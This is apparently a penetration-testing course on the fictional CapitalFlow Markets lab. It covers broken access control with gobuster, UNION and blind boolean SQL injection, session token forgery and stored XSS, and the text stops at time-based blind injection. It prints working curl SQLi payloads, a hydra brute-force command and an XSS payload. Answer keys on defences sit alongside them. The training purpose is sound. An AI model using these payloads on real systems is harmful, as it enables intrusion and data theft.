docs.title: Self-Assessment
docs.text:
Answer the following questions without looking back at the walkthroughs. If you cannot answer confidently, revisit the corresponding exercise.

1. What three server-side controls can slow or stop a brute-force attack against a login endpoint?

2. Why is MD5 with predictable inputs unsuitable for session token generation?

3. What is a parameterized query, and how does it prevent SQL injection?

4. What is the difference between authentication and authorization, and which one does IDOR exploit?

5. Why is stored XSS more dangerous than reflected XSS?

6. What does the HttpOnly flag do, and why should session cookies always use it?

7. How does UNION-based SQL injection determine the number of columns in the original query?

8. Why do sequential integer IDs make IDOR exploitation easier, and does switching to UUIDs fix the vulnerability?

docs.title: Command Cheat Sheet
docs.text: Command Purpose Exercise curl -s -d "email=user&password=pass" http://<target>/login POST login credentials CF2.1 hydra -L users.txt -P pass.txt <target> http-post-form "/login:email=^USER^&password=^PASS^:Invalid" -t 4 -f Brute-force HTTP login form CF2.1 curl -v -d "email=user&password=pass" http://<target>/login 2>&1 \| grep -i "x-session\|x-token" Capture session token metadata from response headers CF2.2 python3 -c "import hashlib; print(hashlib.md5('input'.encode()).hexdigest())" Generate MD5 hash for token forgery CF2.2 curl -s -H "Cookie: session=<token>" http://<target>/admin Access endpoint with forged session token CF2.2 curl -s -b cookies.txt "http://<target>/search?q=' OR '1'='1" Test for SQL injection with always-true condition CF2.3 curl -s -b cookies.txt "http://<target>/search?q=' UNION SELECT NULL,NULL,NULL -- " Determine column count for UNION injection CF2.3 curl -s -b cookies.txt http://<target>/portfolio/1337 Test IDOR by accessing another user's resource CF2.4 curl -s -b cookies.txt -d "message=<script>alert(1)</script>" http://<target>/feedback Submit stored XSS payload CF2.5 echo "<target_ip> hostname.lab" \| sudo tee -a /etc/hosts Add hostname to local hosts file CF2.2-2.5

docs.title: Connect the Dots
docs.text:
Real-world penetration tests rarely use a single technique. The five attack categories from this chapter frequently chain together in multi-stage compromises.

Consider a scenario where the reconnaissance from Chapter 1 reveals a login endpoint and the technology stack. A brute-force attack (CF2.1) discovers valid credentials. Those credentials grant access to the application, where a SQL injection vulnerability (CF2.3) exposes the database schema, including a user table with password hashes. Cracking the admin hash (or forging a session token as in CF2.2) grants admin access. From the admin dashboard, an IDOR vulnerability (CF2.4) exposes all user portfolios. A stored XSS payload (CF2.5) planted in the admin panel captures the cookies of every staff member who logs in, extending the compromise beyond a single account.

Each exercise in isolation demonstrates a single vulnerability class. Combined, they illustrate how attackers escalate from initial access to full organizational compromise through systematic exploitation of multiple flaws.

docs.title: Self-Assessment Answer Key
docs.text:
1. Rate limiting restricts the number of login attempts per IP or account per time window. Account lockout disables the account after a threshold of failures. CAPTCHA challenges require human interaction, blocking automated tools. Implementing all three provides defense in depth.

2. MD5 is deterministic and fast, meaning the same input always produces the same output and millions of candidates can be tested per second. When the inputs (timestamp and user ID) are predictable, an attacker can compute valid tokens for any user. Secure session tokens require cryptographically secure random number generators (CSPRNGs) that produce outputs no attacker can predict.

3. A parameterized query separates SQL code from user data using placeholders. The database engine compiles the query structure first, then inserts user input as literal data values. Because the input is never interpreted as SQL code, injection syntax is treated as a search term rather than query logic.

4. Authentication verifies who the user is (identity). Authorization determines what the user is allowed to do (permissions). IDOR exploits missing authorization checks: the user is authenticated, but the server does not verify they are authorized to access the specific resource they requested.

5. Stored XSS persists on the server and executes in every victim's browser that views the affected page. Reflected XSS requires the victim to click a crafted link. Stored XSS affects multiple victims simultaneously without additional attacker interaction.

6. The HttpOnly flag tells the browser to block JavaScript from accessing the cookie via document.cookie. Session cookies marked HttpOnly cannot be stolen through XSS, because injected scripts cannot read them. All session and authentication cookies should use HttpOnly because client-side JavaScript has no legitimate need to access session tokens directly.

7. The attacker sends UNION SELECT queries with increasing numbers of NULL columns (1, 2, 3, ...) until the database stops returning an error. The number of NULLs that produces a valid response matches the column count of the original query.

8. Sequential integers allow an attacker to enumerate all resources by simply incrementing a counter. UUIDs are harder to guess, which slows enumeration, but do not fix the vulnerability. If the server skips the authorization check, an attacker who obtains a valid UUID (from API responses, error messages, or URL leakage) can still access unauthorized resources. Server-side authorization is the only reliable fix.

docs.title: Beyond Authentication
docs.text:
Chapters 1 and 2 covered the first two phases of a web application assessment: mapping the attack surface and breaking authentication controls. You discovered endpoints, fingerprinted technologies, brute-forced credentials, and exploited session management flaws. Those techniques get you through the front door. The exercises in Chapter 3 go further: bypassing authorization entirely, extracting data through SQL injection, and inferring hidden information one character at a time through blind injection techniques.

CapitalFlow Markets has patched the authentication weaknesses you reported. Management believes the platform is secure because "login is fixed." The exercises in this chapter demonstrate why that belief is dangerous. Authentication (proving who you are) is only half the equation. Authorization (enforcing what you can access) is a separate control that fails independently. And behind every web form and API parameter sits a database query that may trust your input without question.

docs.title: Chapter Exercises
docs.text:
Three exercises build on each other, progressing from simple access control failures to increasingly sophisticated SQL injection techniques.

Exercise Title Core Skill Tools CF3.1 Broken Access Control Accessing restricted resources without authentication curl, gobuster CF3.2 Data Exfiltration via UNION SQLi Extracting data from hidden tables using UNION SELECT curl CF3.3 Blind Boolean SQL Injection Inferring data character-by-character through true/false responses curl, python3

Exercise CF3.1 targets the most common web vulnerability in the OWASP Top 10: broken access control. Exercise CF3.2 introduces UNION-based SQL injection for direct data extraction. Exercise CF3.3 covers blind boolean-based SQL injection, where no data is returned directly and you must write automation to extract information one character at a time.

docs.title: Attack Progression
docs.text:
graph LR
    A["CF3.1<br/>Broken Access Control<br/>No auth needed"] --> B["CF3.2<br/>UNION SQLi<br/>Direct data extraction"]
    B --> C["CF3.3<br/>Blind Boolean SQLi<br/>Character-by-character inference"]

    style A fill:#d9534f,color:#fff
    style B fill:#e8a838,color:#fff
    style C fill:#9b59b6,color:#fff

The progression mirrors real-world complexity. Broken access control requires no special payloads at all: you simply request resources the developer forgot to protect. UNION-based SQL injection requires crafting precise queries but returns data directly in the response. Blind SQL injection returns no visible data, forcing you to ask yes/no questions and reconstruct the answer piece by piece. Each technique demands more patience and skill than the last.

docs.title: Why These Three Techniques Matter Together
docs.text: In practice, a penetration tester encounters all three vulnerability classes on the same engagement. An admin panel with no authorization check (CF3.1) reveals API endpoints. Those endpoints accept unsanitized parameters that allow UNION-based extraction (CF3.2). Other endpoints return only generic success/failure messages, requiring blind techniques (CF3.3). Understanding when to apply each approach separates a methodical assessor from someone running automated scanners and hoping for results.

docs.title: Prerequisites
docs.text:
Confirm each item before starting Exercise CF3.1.

  • You have completed Chapter 2 (Authentication Attacks) and understand session management, brute-force methodology, and basic injection concepts
  • Platform account is active and VPN tunnel is connected
  • Terminal application is open with curl available
  • Python 3 is installed and accessible (needed for CF3.3 automation)
  • You are comfortable reading JSON responses and HTML source code

docs.title: Before You Begin
docs.text: You should have read the Chapter 3 Introduction, which explains the progression from authentication attacks to authorization failures and SQL injection. Your VPN must be connected and your terminal open. No credentials are needed for this exercise. The entire point is that sensitive resources are accessible without any authentication.

docs.title: Scenario
docs.text:
CapitalFlow Markets patched their login system after your Chapter 2 assessment. Management is confident the platform is secure because authentication is now enforced on the main login page. However, the development team deployed several administrative pages and API endpoints that were never integrated into the authentication framework. Internal tools, report generators, and data APIs sit on the same web server, accessible to anyone who knows (or guesses) the URL.

Your assessment objective is to discover and access restricted administrative resources without logging in. The development team assumed that keeping these URLs out of the navigation menu was sufficient protection. Your job is to prove that assumption wrong.

Target: capitalflow-access.lab (port 80)

No credentials are provided. Authentication is not required to complete this exercise. The vulnerability is the absence of authorization checks on sensitive endpoints.

The public face of the patched platform: an unauthenticated visitor sees only a welcome page and a Log In button. The administrative pages are not linked here, and the development team assumed that hiding them from the menu was enough.

docs.title: Your Objectives
docs.text:
• Enumerate the web server for hidden directories and administrative paths
  • Identify API endpoints that return sensitive data without authentication
  • Examine page source code for references to internal resources
  • Access a restricted admin report containing the flag
  • Submit the flag in OCR{...} format

docs.title: Two Separate Controls
docs.text:
Authentication and authorization are distinct security controls that developers frequently conflate. Understanding the difference is critical for both attacking and defending web applications.

Authentication answers the question: "Who are you?" Login forms, API keys, certificates, and multi-factor tokens are all authentication mechanisms. They verify identity.

Authorization answers the question: "What are you allowed to do?" Role checks, access control lists, and permission matrices are authorization mechanisms. They enforce boundaries after identity is established.

A system can have strong authentication and broken authorization simultaneously. If every page requires a login but any logged-in user can access the admin panel, authorization is broken. If certain pages skip the authentication check entirely, both controls are missing.

docs.title: OWASP Broken Access Control
docs.text:
Broken Access Control holds the number one position in the OWASP Top 10 (2021). It moved up from fifth place in the 2017 edition. The category includes:

Failure Description Missing authentication Pages or APIs that require no login at all Missing authorization Authenticated users accessing resources above their privilege level IDOR Predictable object references (IDs, filenames) that allow access to other users' data Forced browsing Accessing administrative pages by guessing URLs that are not linked in the navigation Metadata manipulation Modifying tokens, cookies, or hidden fields to escalate privileges

Exercise CF3.1 focuses on the first and fourth categories: endpoints with no authentication and forced browsing to discover them.

docs.title: Why "Security Through Obscurity" Fails
docs.text: Developers sometimes believe that unlisted URLs are safe because "nobody knows the path." Automated directory enumeration tools like gobuster, dirb, and feroxbuster test thousands of common paths per second. Paths like /admin, /dashboard, /api/users, and /reports appear in every wordlist. Obscurity is not a security control.

docs.title: Tool Primer: gobuster
docs.text: Gobuster is a directory and file brute-forcing tool written in Go. It sends HTTP requests for every entry in a wordlist and reports which paths return valid responses.

docs.title: Basic Directory Enumeration
docs.text:
gobuster dir -u http://target/ -w /usr/share/wordlists/dirb/common.txt

Key flags:

Flag Purpose dir Directory/file enumeration mode -u Target URL -w Path to wordlist file -t Number of concurrent threads (default 10) -s Status codes to consider valid (default: 200,204,301,302,307,401,403) -x File extensions to append (e.g., -x php,html,txt) -o Output results to a file

docs.title: Interpreting Results
docs.text:
Each result line shows the discovered path and its HTTP status code:

  • 200 means the resource exists and returned content
  • 301/302 means the path redirects somewhere (follow it)
  • 403 means the server knows the path exists but denied access (still valuable information)
  • 401 means the server requires authentication (confirms the path exists)
  • 404 means the path does not exist (gobuster filters these by default)

docs.title: Step 1: Launch the Exercise
docs.text: Open the platform and launch "Broken Access Control." Note the target IP for capitalflow-access.lab.

docs.title: Step 2: Explore the Public Site
docs.text:
Start by examining what the site exposes publicly.

Kali - Fetch the homepage and examine its structure

curl -s http://capitalflow-access.lab/

Read the HTML output. Look for navigation links, JavaScript includes, HTML comments, and references to other pages. Note every URL path mentioned in the source.

Kali - Check for a robots.txt file

curl -s http://capitalflow-access.lab/robots.txt

The robots.txt file tells search engine crawlers which paths to avoid indexing. Developers frequently list sensitive paths here, effectively creating a roadmap for attackers. Look for Disallow: entries that reference admin panels, API paths, or internal tools.

Kali - Check for a sitemap

curl -s http://capitalflow-access.lab/sitemap.xml

Sitemaps can reveal the full URL structure of the application, including pages the developers did not intend to be publicly discoverable.

docs.title: Step 3: Enumerate Hidden Directories
docs.text:
Use gobuster to discover paths that are not linked from the homepage.

Kali - Run directory enumeration with a common wordlist

gobuster dir -u http://capitalflow-access.lab/ -w /usr/share/wordlists/dirb/common.txt -t 20

Review every result. Pay special attention to paths returning 200 (accessible) or 301/302 (redirects to content). Record each discovered path. Common administrative paths include /admin, /dashboard, /reports, /settings, /config, and /internal.

Kali - Run a second pass targeting API paths

gobuster dir -u http://capitalflow-access.lab/api/ -w /usr/share/wordlists/dirb/common.txt -t 20

API directories often contain data endpoints that bypass front-end access controls. Record every /api/* path that returns a valid response.

docs.title: Step 4: Probe Common Administrative Paths
docs.text:
Even without gobuster, experienced testers check a standard set of paths manually. Try each of these:

Kali - Check standard admin paths

curl -s -o /dev/null -w "%{http_code} %{url_effective}\n" \
  http://capitalflow-access.lab/admin/ \
  http://capitalflow-access.lab/dashboard/ \
  http://capitalflow-access.lab/reports/ \
  http://capitalflow-access.lab/settings/

The -o /dev/null flag discards the response body, and -w "%{http_code}" prints only the status code. Any path returning 200 is accessible without authentication. Any path returning 301 or 302 may redirect to content worth investigating.

For each path that returned a 200 or redirect, fetch the full content:

Kali - Retrieve the content of accessible admin paths

curl -s http://capitalflow-access.lab/admin/

Examine the response for user data, configuration details, internal links, or references to additional endpoints.

Requesting /admin with no session at all returns the full Admin Dashboard, with links straight to User Management and Financial Reports. The absence of any authorization check on the route is the whole vulnerability, and the flag lives one click away under the reports link.

Kali - Retrieve the dashboard

curl -s http://capitalflow-access.lab/dashboard/

Look for financial data, user lists, system status indicators, or links to reports and exports.

docs.title: Step 5: Explore Unprotected API Endpoints
docs.text:
API endpoints frequently lack authorization checks, especially when they were built for internal use and later exposed on the public-facing server.

Kali - Check the transactions API

curl -s http://capitalflow-access.lab/api/transactions | python3 -m json.tool

If the endpoint returns JSON data, examine every field. Look for account numbers, trade details, timestamps, and any fields containing notes or flags.

Kali - Check the users API

curl -s http://capitalflow-access.lab/api/users | python3 -m json.tool

An unauthenticated user listing exposes usernames, email addresses, roles, and potentially hashed passwords. Record everything.

Kali - Check the reports API

curl -s http://capitalflow-access.lab/api/reports | python3 -m json.tool

Report endpoints often aggregate sensitive data from multiple sources. Look for financial summaries, audit logs, and compliance reports.

docs.title: Step 6: Inspect HTML Source for Hidden References
docs.text:
Developers sometimes leave references to internal tools in HTML comments or JavaScript variables.

Kali - Search the homepage source for comments and hidden links

curl -s http://capitalflow-access.lab/ | grep -iE "<!--|href=|src=|api|admin|report|internal"

HTML comments (<!-- ... -->) frequently contain TODO notes, debugging URLs, and references to endpoints that were meant to be removed before deployment. JavaScript src attributes may point to admin-specific scripts that reveal endpoint paths.

Kali - Search the admin page source for additional endpoints

curl -s http://capitalflow-access.lab/admin/ | grep -iE "<!--|href=|src=|api|report|endpoint"

Follow every link and script reference you find. Each one may lead to additional unprotected resources.

docs.title: Step 7: Find the Flag
docs.text:
The flag is stored in a restricted admin report that has no access control check. Based on the paths you discovered in previous steps, access the report endpoint:

Kali - Access the admin reports page

curl -s http://capitalflow-access.lab/admin/reports

Look for the flag in OCR{...} format in the response body. If the report page contains links to individual reports, follow each one:

Kali - Search all discovered pages for the flag pattern

curl -s http://capitalflow-access.lab/admin/reports | grep -i "OCR{"

Once you locate the flag, submit it on the platform.

docs.title: Record Your Findings
docs.text:
Paths discovered via robots.txt:

(list Disallow entries here)

Paths discovered via gobuster:

Path Status Code Content Summary

Unprotected API endpoints:

Endpoint Data Returned

HTML comments or hidden references found:

(paste relevant comments here)

Flag: OCR{...}

docs.title: Analysis Questions
docs.text:
1. The admin report page returned a 200 status code with full content, even though you never authenticated. What server-side check is missing, and where should it be implemented?

Reveal Answer

The server is missing an authorization middleware or decorator on the admin report route. Every request handler for a restricted resource should verify that the requester has a valid session token AND that the session belongs to a user with the appropriate role (e.g., admin). The check should be implemented at the route handler level (as middleware or a decorator that runs before the handler function), not in the front-end navigation. Front-end controls (hiding menu links, disabling buttons) are cosmetic and provide no security because attackers interact directly with the server using tools like curl.

2. A developer argues that removing admin links from the navigation menu is sufficient protection because "nobody will guess the URL." Why is that argument flawed?

Reveal Answer

Directory enumeration tools like gobuster, dirb, and feroxbuster test thousands of common paths per minute against a target. Wordlists compiled from millions of real websites include paths like /admin, /dashboard, /reports, /api/users, and hundreds of variations. Robots.txt files, HTML comments, JavaScript source maps, and error messages also leak path information. Security through obscurity fails because the cost of guessing is near zero for an attacker while the cost of maintaining obscurity (ensuring no reference is ever leaked) is impossibly high.

3. You found unprotected API endpoints that return user data and transaction records. In a financial application, what regulatory and legal consequences could result from this exposure?

Reveal Answer

Financial applications are subject to regulations including PCI DSS (for payment data), SOX (for financial reporting integrity), GLBA (for consumer financial privacy), and GDPR/state privacy laws (for personal data). Exposing user records and transaction data without authentication violates multiple compliance requirements. Consequences include regulatory fines, mandatory breach notification to affected customers, civil liability for damages, loss of payment processing privileges, and reputational harm. The lack of access controls would also fail any SOC 2 audit, potentially disqualifying the company from enterprise partnerships.

docs.title: Key Takeaways
docs.text:
• Broken access control is the number one vulnerability in the OWASP Top 10 because it is pervasive and the impact is severe
  • Authentication (verifying identity) and authorization (enforcing permissions) are separate controls that must both be implemented on every restricted endpoint
  • Hiding URLs from navigation menus provides zero security; directory enumeration discovers unlisted paths in seconds
  • Robots.txt, HTML comments, JavaScript files, and error messages frequently leak the paths developers tried to hide
  • API endpoints are especially prone to missing authorization because developers build them for internal use and forget to add access controls when the API becomes externally reachable
  • Every server-side route handler for restricted content must verify both authentication and authorization before returning data

docs.title: Exercise CF3.2: Data Exfiltration via UNION SQL Injection
Before You Begin
docs.text: You should have completed Exercise CF3.1 (Broken Access Control). Your VPN must be connected and your terminal open. The only tool required is curl. Understanding basic SQL SELECT syntax will help, but the background section covers everything you need.

docs.title: Scenario
docs.text:
CapitalFlow Markets exposes a public API endpoint at /api/transactions that allows users to filter transaction records by stock ticker symbol. The endpoint accepts a ticker query parameter and returns matching trades from a SQLite database.

During your access control assessment, you noted that this endpoint performs no input validation on the ticker parameter. Your objective is to confirm that the parameter is vulnerable to SQL injection, determine the database structure, locate a table named sensitive_trades, and extract its contents, including a flag stored in the database.

Target: capitalflow-sqli-exfil.lab (port 80)

No credentials are provided. The vulnerable endpoint is publicly accessible.

docs.title: Your Objectives
docs.text:
• Confirm the /api/transactions endpoint is vulnerable to SQL injection
  • Determine the number of columns returned by the original query
  • Use UNION SELECT to enumerate all tables in the SQLite database
  • Discover the structure of the sensitive_trades table
  • Extract the flag from the sensitive_trades table
  • Submit the flag in OCR{...} format

docs.title: What Is UNION SELECT?
docs.text:
The SQL UNION operator combines the results of two SELECT queries into a single result set. For UNION to work, both queries must return the same number of columns, and the data types must be compatible.

A normal query:

SELECT ticker, amount, price FROM transactions WHERE ticker='AAPL'

An injected UNION query:

SELECT ticker, amount, price FROM transactions WHERE ticker='' UNION SELECT username, password, role FROM users --'

The first query returns zero rows (no ticker matches empty string). The UNION appends the results of the second query. The application displays the combined result set, unknowingly returning data from a completely different table.

docs.title: The UNION SQLi Process
docs.text:
The attack follows a consistent methodology:

  1. Confirm injection by breaking the query with a single quote
  2. Determine column count by testing UNION SELECT NULL, NULL, ... with increasing NULLs until the query succeeds
  3. Identify displayable columns by placing string markers in each position
  4. Enumerate the schema by querying metadata tables (sqlite_master, information_schema)
  5. Extract target data by querying the discovered tables and columns

docs.title: SQLite vs. MySQL vs. PostgreSQL
docs.text:
Different databases store schema metadata in different locations:

Database Schema Table Query to List Tables SQLite sqlite_master SELECT name FROM sqlite_master WHERE type='table' MySQL information_schema.tables SELECT table_name FROM information_schema.tables PostgreSQL information_schema.tables SELECT table_name FROM information_schema.tables

SQLite uses sqlite_master as its system catalog. Each row describes one database object (table, index, view, or trigger). The key columns are:

Column Description type Object type: 'table', 'index', 'view', or 'trigger' name Name of the object tbl_name Name of the table the object belongs to sql The CREATE statement that defined the object

The sql column is especially valuable because it reveals the full column definitions of every table, including column names and data types.

docs.title: URL Encoding for Injection
docs.text:
When injecting through URL parameters, special characters must be URL-encoded:

Character Encoded Purpose in SQLi Space %20 or + Separates SQL keywords Single quote %27 Breaks string literals Hash # %23 MySQL comment character Double dash -- --%20 SQL comment (needs trailing space)

The --data-urlencode flag in curl handles encoding automatically for POST data, but for GET parameters you must encode manually or use curl --get --data-urlencode.

docs.title: Step 1: Launch the Exercise
docs.text: Open the platform and launch "Data Exfiltration via UNION SQLi." Note the target IP for capitalflow-sqli-exfil.lab.

docs.title: Step 2: Explore the Transactions Endpoint
docs.text:
Start by sending a legitimate request to understand the normal response format.

Kali - Query transactions for a known ticker symbol

curl -s "http://capitalflow-sqli-exfil.lab/api/transactions?ticker=AAPL" | python3 -m json.tool

Examine the JSON response carefully. Count the number of fields returned for each transaction record. Note the field names, data types (strings, numbers, dates), and the overall structure. The number of fields tells you how many columns the underlying SQL query selects.

Kali - Try a different ticker to confirm the parameter filters results

curl -s "http://capitalflow-sqli-exfil.lab/api/transactions?ticker=MSFT" | python3 -m json.tool

Compare the two responses. Different tickers should return different transaction sets, confirming the parameter controls the WHERE clause.

docs.title: Step 3: Test for SQL Injection
docs.text:
Inject a single quote to break the SQL query syntax and observe the response.

Kali - Send a single quote to test for injection

curl -s "http://capitalflow-sqli-exfil.lab/api/transactions?ticker=AAPL%27"

If the application is vulnerable, the single quote breaks the SQL string literal and causes a database error. Look for error messages mentioning "SQL," "syntax," "query," "sqlite3," or "unrecognized token." An error confirms injection is possible.

Kali - Confirm injection with a tautology that restores valid syntax

curl -s "http://capitalflow-sqli-exfil.lab/api/transactions?ticker=AAPL%27%20OR%20%271%27=%271"

The payload AAPL' OR '1'='1 closes the original string, adds a condition that is always true, and keeps the SQL syntax valid. If the response returns more results than the original AAPL query, the tautology injection succeeded and the parameter is confirmed vulnerable.

docs.title: Step 4: Determine the Column Count
docs.text:
UNION SELECT requires matching the exact number of columns in the original query. Test with increasing numbers of NULL values until the query succeeds.

Kali - Test UNION with 1 column

curl -s "http://capitalflow-sqli-exfil.lab/api/transactions?ticker=%27%20UNION%20SELECT%20NULL--%20"

If the query fails (error or empty response), the column count does not match. Increment and try again:

Kali - Test UNION with 2 columns

curl -s "http://capitalflow-sqli-exfil.lab/api/transactions?ticker=%27%20UNION%20SELECT%20NULL,NULL--%20"

Kali - Test UNION with 3 columns

curl -s "http://capitalflow-sqli-exfil.lab/api/transactions?ticker=%27%20UNION%20SELECT%20NULL,NULL,NULL--%20"

Kali - Test UNION with 4 columns

curl -s "http://capitalflow-sqli-exfil.lab/api/transactions?ticker=%27%20UNION%20SELECT%20NULL,NULL,NULL,NULL--%20"

Kali - Test UNION with 5 columns

curl -s "http://capitalflow-sqli-exfil.lab/api/transactions?ticker=%27%20UNION%20SELECT%20NULL,NULL,NULL,NULL,NULL--%20"

The query that succeeds (returns data instead of an error) reveals the correct column count. The target uses 5 columns. When you see a valid JSON response with null values, you have found the right number.

docs.title: Step 5: Identify Displayable Columns
docs.text:
Replace NULL values with string markers to determine which column positions appear in the output.

Kali - Place string markers in each column position

curl -s "http://capitalflow-sqli-exfil.lab/api/transactions?ticker=%27%20UNION%20SELECT%20%27col1%27,%27col2%27,%27col3%27,%27col4%27,%27col5%27--%20" | python3 -m json.tool

Examine the JSON response. Each field that displays "col1," "col2," etc. is a displayable position where you can place extraction queries. Fields that show null or are absent do not render string output. Focus your extraction on the displayable positions.

docs.title: Step 6: Enumerate Database Tables
docs.text:
Query the sqlite_master table to list all tables in the database.

Kali - Extract table names from sqlite_master

curl -s "http://capitalflow-sqli-exfil.lab/api/transactions?ticker=%27%20UNION%20SELECT%20name,%27x%27,%27x%27,%27x%27,%27x%27%20FROM%20sqlite_master%20WHERE%20type=%27table%27--%20" | python3 -m json.tool

The response lists every table in the database. Look for the sensitive_trades table along with any other tables that might contain interesting data (users, credentials, configurations). Record all table names.

docs.title: Step 7: Discover Table Structure
docs.text:
Retrieve the CREATE statement for the sensitive_trades table to learn its column names.

Kali - Extract the CREATE TABLE statement for sensitive_trades

curl -s "http://capitalflow-sqli-exfil.lab/api/transactions?ticker=%27%20UNION%20SELECT%20sql,%27x%27,%27x%27,%27x%27,%27x%27%20FROM%20sqlite_master%20WHERE%20name=%27sensitive_trades%27--%20" | python3 -m json.tool

The sql column from sqlite_master returns the full CREATE TABLE statement. Read it carefully to identify every column name and data type. Look for columns named flag, secret, data, notes, or similar. Record the complete schema.

docs.title: Step 8: Extract the Flag
docs.text:
Query the sensitive_trades table for the flag value.

Kali - Extract all rows from sensitive_trades

curl -s "http://capitalflow-sqli-exfil.lab/api/transactions?ticker=%27%20UNION%20SELECT%20*%20FROM%20sensitive_trades--%20" | python3 -m json.tool

If SELECT * does not work (column count mismatch), specify the columns explicitly based on the schema you discovered in Step 7:

Kali - Extract specific columns from sensitive_trades

curl -s "http://capitalflow-sqli-exfil.lab/api/transactions?ticker=%27%20UNION%20SELECT%20flag,%27x%27,%27x%27,%27x%27,%27x%27%20FROM%20sensitive_trades--%20" | python3 -m json.tool

Look through the response for a value in OCR{...} format. The flag is stored in the flag column of the sensitive_trades table. Once you find it, submit the flag on the platform.

docs.title: Record Your Findings
docs.text:
Normal response column count: ___

Displayable column positions: ___

Tables discovered in database:

Table Name Purpose (guessed)

sensitive_trades schema:

(paste CREATE TABLE statement here)

Data extracted from sensitive_trades:

(paste extracted records here)

Flag: OCR{...}

docs.title: Analysis Questions
docs.text:
1. Why does the UNION SELECT technique require matching the exact column count of the original query? What happens if the count is wrong?

Reveal Answer

The SQL UNION operator combines two result sets by appending the rows from the second query to the rows from the first. For the database to merge these result sets, they must have identical structures: the same number of columns in the same order. If the column count does not match, the database returns a syntax error because it cannot combine rows with different numbers of fields. The attacker must determine the correct count through trial and error (incrementing NULLs) before any data extraction is possible.

2. How does querying sqlite_master differ from querying information_schema in MySQL or PostgreSQL? Why does identifying the database type matter during SQL injection?

Reveal Answer

SQLite stores all schema metadata in a single table called sqlite_master with columns for type, name, tbl_name, rootpage, and sql. MySQL and PostgreSQL use the information_schema database, which contains multiple tables (tables, columns, schemata, etc.) with more detailed metadata. Identifying the database type matters because schema enumeration queries are database-specific. A query against sqlite_master fails on MySQL, and a query against information_schema.tables fails on SQLite. The attacker must identify the backend (through error messages, version functions, or behavioral differences) before writing extraction queries.

3. The ticker parameter is vulnerable because user input is concatenated directly into a SQL query. What is the correct way to handle this parameter on the server side?

Reveal Answer

The server should use parameterized queries (prepared statements) where the ticker value is bound as a parameter rather than concatenated into the query string. In Python with SQLite, the correct pattern is: cursor.execute("SELECT * FROM transactions WHERE ticker=?", (ticker_value,)). The database driver treats the parameter as literal data, never as SQL syntax. Even if the parameter contains single quotes, UNION keywords, or comment characters, the database interprets the entire value as a string to match against the ticker column. Input validation (rejecting values that contain SQL metacharacters) provides defense-in-depth but is not a substitute for parameterized queries.

4. Beyond parameterized queries, what additional defenses could prevent or limit the impact of UNION-based SQL injection?

Reveal Answer

Multiple layers of defense reduce the risk and impact: (1) Least-privilege database accounts ensure the application connects with a user that has SELECT access only to required tables, preventing access to sensitive_trades even if injection succeeds. (2) Web Application Firewalls (WAF) detect and block common injection patterns like UNION SELECT in query parameters. (3) Input validation rejects ticker values that do not match expected patterns (e.g., 1-5 uppercase letters). (4) Error handling suppresses database error messages that reveal schema details and database type. (5) Column-level access control in the application layer ensures the API only returns approved fields, even if the underlying query is manipulated. (6) Database activity monitoring detects anomalous queries like those containing UNION SELECT against sqlite_master.

docs.title: Key Takeaways
docs.text:
• UNION-based SQL injection allows an attacker to append a second query and extract data from any table the database user can access
  • The attack follows a consistent methodology: confirm injection, determine column count, find displayable positions, enumerate schema, extract data
  • SQLite stores schema metadata in sqlite_master, while MySQL and PostgreSQL use information_schema; identifying the database type is a prerequisite for schema enumeration
  • The sql column in sqlite_master reveals full CREATE TABLE statements, exposing column names and types for every table
  • Parameterized queries eliminate SQL injection entirely by separating data from code at the database driver level
  • Defense-in-depth (WAF, least-privilege, input validation, error suppression) limits the impact when a single control fails

docs.title: Exercise CF3.3: Blind Boolean SQL Injection
Before You Begin
docs.text: You should have completed Exercises CF3.1 and CF3.2. The UNION-based technique from CF3.2 extracted data directly in the response. Blind SQL injection is fundamentally different: the application never shows you the data. Instead, you infer it by asking the database true/false questions and observing which response the application returns. Your VPN must be connected and you need both curl and Python 3 available.

docs.title: Scenario
docs.text:
CapitalFlow Markets provides a portfolio lookup feature at /portfolio/filter that accepts a ticker parameter. The endpoint does not return transaction data. It returns only one of two responses:

  • "Portfolio data available" when the query matches at least one row
  • "No data found" when the query matches zero rows

The developers assumed that hiding the actual data in the response would prevent SQL injection exploitation. They were wrong. The binary response (data exists vs. data does not exist) leaks one bit of information per request. By crafting conditional SQL statements and observing which response the server returns, you can extract the contents of any column in the database, one character at a time.

Your objective is to extract the flag from the hidden_flag column of the admin_secrets table using boolean-based blind SQL injection. The flag is 20 characters long and follows the OCR{...} format.

Target: capitalflow-blind-sqli.lab (port 80)

No credentials are provided. The vulnerable endpoint is publicly accessible.

docs.title: Your Objectives
docs.text:
• Confirm the /portfolio/filter endpoint is vulnerable to boolean-based blind SQL injection
  • Understand the true/false response pattern
  • Determine the length of the flag value
  • Extract the flag character by character using SUBSTR()
  • Write a Python script to automate the extraction
  • Submit the flag in OCR{...} format

docs.title: When Data Stays Hidden
docs.text: In UNION-based injection (CF3.2), extracted data appears directly in the application's response. Blind SQL injection covers scenarios where the application reveals no data at all. The response is the same generic page regardless of what the database returns. The only difference is a subtle behavioral change: a slightly different message, a different HTTP status code, or a measurable time delay.

docs.title: Boolean-Based Blind SQLi
docs.text:
Boolean-based blind injection exploits applications that behave differently based on whether a SQL condition evaluates to true or false. The attacker appends a conditional expression to the injection point:

-- True condition: original query returns results
AAPL' AND 1=1 --

-- False condition: original query returns no results
AAPL' AND 1=2 --

If the application shows "Portfolio data available" for the first payload and "No data found" for the second, the injected AND clause is being evaluated by the database. The attacker now has a one-bit oracle: any question that can be expressed as a true/false SQL condition can be answered.

docs.title: Extracting Data Character by Character
docs.text:
SQL provides functions to inspect individual characters of a string:

Function Database Purpose SUBSTR(string, pos, len) SQLite, MySQL, PostgreSQL Extract a substring starting at pos for len characters LENGTH(string) SQLite, MySQL Return the length of a string CHAR_LENGTH(string) MySQL Return the character length ASCII(char) MySQL, PostgreSQL Return the ASCII code of a character UNICODE(char) SQLite Return the Unicode code point of a character

To extract the first character of a value, the attacker tests:

AAPL' AND SUBSTR((SELECT hidden_flag FROM admin_secrets),1,1)='O' --

If the application returns the "true" response, the first character is 'O'. If it returns the "false" response, the first character is not 'O'. The attacker repeats for every possible character value until a match is found, then moves to position 2, then position 3, and so on.

docs.title: Why Automation Is Necessary
docs.text: Extracting a 20-character string by testing each position against every printable ASCII character (roughly 95 possibilities) requires up to 1,900 HTTP requests in the worst case. Manual extraction with curl is possible for one or two characters but impractical for a full string. A Python script can complete the extraction in under a minute.

docs.title: Time-Based Blind SQLi
docs.text:
When the application returns an identical response regardless of the query result (same HTTP status, same body, same headers), the attacker can use time-based techniques instead:

